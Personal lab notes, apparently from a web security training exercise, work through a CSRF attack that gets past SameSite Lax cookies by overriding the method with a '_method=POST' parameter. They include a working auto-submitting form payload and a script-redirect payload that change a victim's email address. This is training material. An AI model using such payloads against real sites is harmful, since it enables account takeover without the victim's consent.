```bash
1. login
2. update: email  &&  navigate to the response: no protection against CSRF

TEST CASE
a. change to POST method to GET  --  Method Not Allowed

CONCLUSION
a. the default lax setting on this website means it only works with GET requests
b. when the method was changed from POST to GET, it showed 'Method Not Allowed'

In Order To Exploit
a. supply a POST method in the GET parameter which we tried
   try parameter fuzzing to find which parameter is allowed  --  &_method=POST  --  302 Found
   GET /my-account/change-email?email=mango%40fake.com&_method=POST

3. generate a CSRF PoC  --  update the email value

CSRF PAYLOAD

<!DOCTYPE html>
<html lang="en">
	<body>
			<form method="GET" action="https://lab-id.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="mango@fake.com">
			<input type="hidden" name="_method" value="POST">
			<input type="submit" value="Submit Request">
		</form>
	</body>
	<script>document.forms[0].submit();</script>
</html>


7. press the back button of the browser  --  do not refresh the browser
8. go to the exploit server deliver to the victim and done
9. NOTE if you viewed the exploit then update the email value

OR

right click to the response and press Copy URL
<script>
location="https://lab-id.web-security-academy.net/my-account/change-email?email=mango%40fake.com&_method=POST"
</script>
```
